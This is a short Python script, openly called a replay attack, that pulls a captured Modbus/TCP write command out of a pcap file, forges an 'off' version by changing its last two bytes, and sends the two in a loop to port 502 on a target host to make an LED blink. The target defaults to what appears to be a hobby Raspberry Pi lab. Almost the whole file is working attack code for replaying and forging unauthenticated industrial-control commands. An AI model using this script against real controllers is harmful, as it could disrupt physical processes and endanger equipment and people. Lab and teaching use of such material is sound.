#!/usr/bin/env python3
"""replay attack - create blinking from single ON capture"""
import socket
import time
import sys
from scapy.all import rdpcap, Raw
from scapy.layers.inet import TCP

# path to pcap
packets = rdpcap("/path/to/pcap")

# find the modbus on payload
led_on_payload = None
for pkt in packets:
    if TCP in pkt and Raw in pkt and pkt[TCP].dport == 502:
        payload = bytes(pkt[Raw])
        if len(payload) >= 12:  # valid modbus
            led_on_payload = payload
            break

# create OFF payload by changing last 2 bytes
# ON:  ...FF00
# OFF: ...0000
led_off_payload = bytearray(led_on_payload)
led_off_payload[-2:] = b'\x00\x00'  # change FF00 to 0000 (on to off)

print(f"[+] ON payload:  {led_on_payload.hex()}")
print(f"[+] OFF payload: {led_off_payload.hex()}")

target = sys.argv[1] if len(sys.argv) > 1 else "raspberrypi.local"

print("[*] starting blink attack - LED will flash!")

while True:
    try:
        # LED ON
        s = socket.socket()
        s.connect((target, 502))
        s.send(led_on_payload)
        s.close()
        print("[>] LED ON")
        time.sleep(1)

        # LED OFF
        s = socket.socket()
        s.connect((target, 502))
        s.send(bytes(led_off_payload))
        s.close()
        print("[>] LED OFF")
        time.sleep(1)

    except KeyboardInterrupt:
        print("\n[!] attack stopped")
        break
